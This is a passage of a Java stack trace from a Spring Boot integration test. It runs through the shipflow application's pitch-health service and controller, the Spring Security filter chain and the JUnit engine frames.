	at java.base/java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1708) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:509) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:499) ~[na:na]
	at java.base/java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:921) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) ~[na:na]
	at java.base/java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:682) ~[na:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.getCycleHealthSummary(PitchHealthService.java:201) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.lambda$getAllActiveCycleHealth$12(PitchHealthService.java:295) ~[classes/:na]
	at java.base/java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:197) ~[na:na]
	at java.base/java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1708) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:509) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:499) ~[na:na]
	at java.base/java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:921) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) ~[na:na]
	at java.base/java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:682) ~[na:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.getAllActiveCycleHealth(PitchHealthService.java:296) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService$$SpringCGLIB$$0.getAllActiveCycleHealth(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.PitchHealthController.getAllActiveCycleHealthWithAI(PitchHealthController.java:73) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:903) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:564) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.PitchHealthControllerIntegrationTest.getAllActiveCycleHealth_WithAI_ShouldReturnEnhancedAnalysis(PitchHealthControllerIntegrationTest.java:265) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
